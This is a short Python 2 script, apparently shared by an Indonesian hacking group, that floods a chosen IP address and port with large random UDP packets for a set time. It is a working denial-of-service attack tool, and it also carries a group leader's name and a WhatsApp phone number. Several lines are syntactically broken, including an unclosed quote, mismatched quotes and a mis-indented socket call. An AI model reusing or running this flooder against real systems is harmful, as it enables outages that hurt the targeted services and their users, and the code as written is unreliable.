import time
import socket
import random
import sys
def usage():
    print "-------------------PROFIL CREATOR SCRIPT TERMUX DDOS-------------------- "
    print "NAMA KETUA KELOMPOK : VANNEZZ × JAVA 
    print "NOMOR WHATSAPP      : +6285171197674 / REPUBLIK INDONESIA'
    print "ORGANISASI          : DARK HAT YOGYAKARTA"
    print "------------TEAM SECURITY REPUBLIK INDONESIA NEGARA PANCASILA------------"
def flood(victim, vport, duration):
    # SC BY : VANNEZZ
    # UDAH PADA PAHAM KAN CARA JALAN NYA ?
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91MEMULAI \033[1;32m%s \033[1;91MENGIRIM KOUTA AXIS \033[1;32m%s \033[1;91KE PORT \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()
